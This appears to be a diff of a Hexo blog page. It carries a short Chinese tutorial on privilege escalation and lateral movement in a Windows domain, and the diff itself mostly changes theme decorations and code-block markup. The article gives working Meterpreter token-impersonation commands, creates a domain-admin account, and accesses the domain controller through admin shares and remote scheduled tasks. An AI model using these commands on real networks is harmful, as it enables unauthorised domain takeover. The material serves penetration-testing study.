@@ -236,75 +236,12 @@ load mi">
         </li>
         
         
-        <li><div class="divider"></div></li>
-        <li>
-            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
-                <i class="fab fa-github-square fa-fw"></i>Fork Me
-            </a>
-        </li>
-        
     </ul>
 </div>
 
 
         </div>
 
-        
-            <style>
-    .nav-transparent .github-corner {
-        display: none !important;
-    }
-
-    .github-corner {
-        position: absolute;
-        z-index: 10;
-        top: 0;
-        right: 0;
-        border: 0;
-        transform: scale(1.1);
-    }
-
-    .github-corner svg {
-        color: #0f9d58;
-        fill: #fff;
-        height: 64px;
-        width: 64px;
-    }
-
-    .github-corner:hover .octo-arm {
-        animation: a 0.56s ease-in-out;
-    }
-
-    .github-corner .octo-arm {
-        animation: none;
-    }
-
-    @keyframes a {
-        0%,
-        to {
-            transform: rotate(0);
-        }
-        20%,
-        60% {
-            transform: rotate(-25deg);
-        }
-        40%,
-        80% {
-            transform: rotate(10deg);
-        }
-    }
-</style>
-
-<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
-   data-tooltip="Fork Me" data-position="left" data-delay="50">
-    <svg viewBox="0 0 250 250" aria-hidden="true">
-        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
-        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
-              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
-        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
-              fill="currentColor" class="octo-body"></path>
-    </svg>
-</a>
         
     </nav>
 
@@ -481,7 +418,7 @@ load mi">
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    353
+                    339
                 </div>
                 
 
@@ -504,7 +441,7 @@ load mi">
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <h1 id="纵向移动和横向移动"><a href="#纵向移动和横向移动" class="headerlink" title="纵向移动和横向移动"></a>纵向移动和横向移动</h1><h2 id="纵向移动"><a href="#纵向移动" class="headerlink" title="纵向移动"></a>纵向移动</h2><p>之前已经拿到system权限</p>
-<pre><code>ps    \\查看进程
+<pre class=" language-shell"><code class="language-shell">ps    \\查看进程
 migrate 1880  \\把自己进程迁移到1880里
 use incognito
 list_tokens -u   \\可以使用哪些用户
@@ -514,15 +451,15 @@ kerberos_ticket_use
 </code></pre>
 <p>管理员做过一些事情，但是没有退出</p>
 <p>如果进入域管理员</p>
-<pre><code>getsystem
+<pre class=" language-shell"><code class="language-shell">getsystem
 impersonate_token TEST1\Administrator  \\提权到域控管理员
 add_user test2 tset123! -h 域控ip
-add_group_user &quot;domain admins&quot; test2 -h 域控ip  \\扔进组里
+add_group_user "domain admins" test2 -h 域控ip  \\扔进组里
 shell
-net group &quot;domain admins&quot; /domain
+net group "domain admins" /domain
 </code></pre>
 <h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><p>入侵了一台普通的域内服务器之后，可以通过一些方法提权到system权限</p>
-<pre><code>ps
+<pre class=" language-shell"><code class="language-shell">ps
 use incognito
 list_tokens -u
 impersonate_token TEST1\\Administrator
@@ -530,35 +467,35 @@ getuid
 </code></pre>
 <p>通过一些方法知道域的ip地址</p>
 <p>可以映射网络驱动器</p>
-<pre><code>在文件夹里面
+<pre class=" language-shell"><code class="language-shell">在文件夹里面
 \\域控ip\c$
 通过域控管理员直接连接
 </code></pre>
 <p>在cmd里</p>
-<pre><code>net use \\域控ip\c$ &quot;test123!&quot; /user:test2
+<pre class=" language-shell"><code class="language-shell">net use \\域控ip\c$ "test123!" /user:test2
 net share
 net use   建立管道
 dir \\域控ip\c$
 type \\域控ip\c$\this-is-dc.txt
 </code></pre>
 <p>当对方开了135和445端口的时候</p>
-<pre><code>net use \\域控ip\ipc$ &quot;test123!&quot; /user:test2
+<pre class=" language-shell"><code class="language-shell">net use \\域控ip\ipc$ "test123!" /user:test2
 </code></pre>
 <p>远程访问进程</p>
-<pre><code>tasklist /S 域控ip /U test2 /P test123!
+<pre class=" language-shell"><code class="language-shell">tasklist /S 域控ip /U test2 /P test123!
 </code></pre>
 <p>进入session里面</p>
-<pre><code>shell
-echo &#39;haha&#39; &gt; a.txt
+<pre class=" language-shell"><code class="language-shell">shell
+echo 'haha' > a.txt
 </code></pre>
 <p>然后在cmd里</p>
-<pre><code>copy a.txt \\域控ip\c$
+<pre class=" language-shell"><code class="language-shell">copy a.txt \\域控ip\c$
 </code></pre>
 <p>也可以远程计划任务</p>
-<pre><code>at \\域控ip 9:51PM cmd.exe /c &quot;ipconfig &gt; c:/1.txt&quot;
+<pre class=" language-shell"><code class="language-shell">at \\域控ip 9:51PM cmd.exe /c "ipconfig > c:/1.txt"
 </code></pre>
 <p>如果系统版本比较新</p>
-<pre><code>schtasks /create /s 域控ip /tn test1 /sc onstrat /tr c:/a.bat /ru system / 
+<pre class=" language-shell"><code class="language-shell">schtasks /create /s 域控ip /tn test1 /sc onstrat /tr c:/a.bat /ru system / 
 </code></pre>
 
                 
@@ -1315,16 +1252,20 @@ $(function () {
     
 
     <!-- 雪花特效 -->
-     
-        <script type="text/javascript">
-            // 只在桌面版网页启用特效
-            var windowWidth = $(window).width();
-            if (windowWidth > 768) {
-                document.write('<script type="text/javascript" src="/libs/others/snow.js"><\/script>');
-            }
-        </script>
     
+	
+	<!-- 冒泡 -->
+	
+		<script type="text/javascript">
+			// 只在桌面版网页启用特效
+			var windowWidth = $(window).width();
+			document.write(
+				'<script type="text/javascript" src="/libs/others/buble.js"><\/script>'
+			);
+		</script>
+	
 
+	
     <!-- 鼠标星星特效 -->
     
 
